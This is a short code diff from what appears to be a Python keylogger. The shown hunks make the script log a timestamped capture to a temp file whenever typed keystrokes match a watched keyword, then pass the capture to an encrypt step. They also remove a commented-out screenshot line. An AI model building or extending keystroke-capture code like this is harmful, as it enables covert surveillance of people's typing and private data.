@@ -122,6 +122,7 @@ def keystroke(key):
             for key_word in wordkey:
                 if key_word in searchword:
                     print("detect : " + searchword + '\n')
+                    capturekey("_Word")
                     new = 1
             if 'Key.cmdKey.space' in searchword:
                 with open(filecheck, 'w') as f:
@@ -148,7 +149,6 @@ def capturekey(k):
     with open('Temp/Capture.txt', 'a') as f:
         f.write(ti + k + '\n')
 
-    # pyautogui.screenshot().save('Temp\\Capture\\'+x)
     encrypt(x)
 
 def encrypt(file):
